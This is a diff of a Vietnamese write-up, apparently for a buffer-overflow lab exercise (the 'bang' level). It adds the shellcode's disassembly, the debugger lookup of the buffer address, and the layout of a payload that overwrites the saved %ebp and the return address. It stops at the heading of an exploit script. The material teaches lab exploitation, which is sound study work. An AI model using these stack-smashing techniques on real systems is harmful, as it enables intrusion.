@@ -39,6 +39,33 @@ call 0x80139B69
 ```  
 
 Ở shellcode trên, chúng ta gán địa chỉ của biến `cookie` vào thanh ghi `%eax`. Sau đó, chúng ta đọc giá trị `cookie` và gán giá trị đó vào `%eax`. Kế đến, chúng ta gán giá trị `cookie` này vào `global_value`, và cuối cùng là gọi hàm `bang`.  
-> `0x80139B69` chính là địa chỉ của hàm `bang`.
+> `0x80139B69` chính là địa chỉ của hàm `bang`.  
 
+Byte representation của shellcode:  
+```
+└─$ objdump -d shellcode.o
+
+shellcode.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:   a1 58 f1 13 80          mov    0x8013f158,%eax
+   5:   89 00                   mov    %eax,(%eax)
+   7:   a3 60 f1 13 80          mov    %eax,0x8013f160
+   c:   e8 65 9b 13 80          call   0x80139b76
+```
+
+Tiếp theo, chúng ta sẽ tìm địa chỉ để ghi đè vào `return address`.  
+Ở đây, vì shellcode sẽ được chèn vào đầu chuỗi nhập nên giá trị mà chúng ta sẽ ghi đè lên `return address` chính là địa chỉ của chuỗi nhập. Trong quá trình debug thì chúng ta tìm được địa chỉ là:  
+```
+pwndbg> p/x $eax
+$1 = 0x55683cf8
+```  
+
+Vậy `exploit_payload` của chúng ta sẽ có độ dài là `0x28 + 0x4 + 0x4` với `0x28` bytes sẽ chứa shellcode và các giá trị padding, `0x4` bytes tiếp theo để ghi đè `saved %ebp`, và `0x4` bytes cuối cùng để ghi đè `return address`.  
+
+### Script
+```python
 
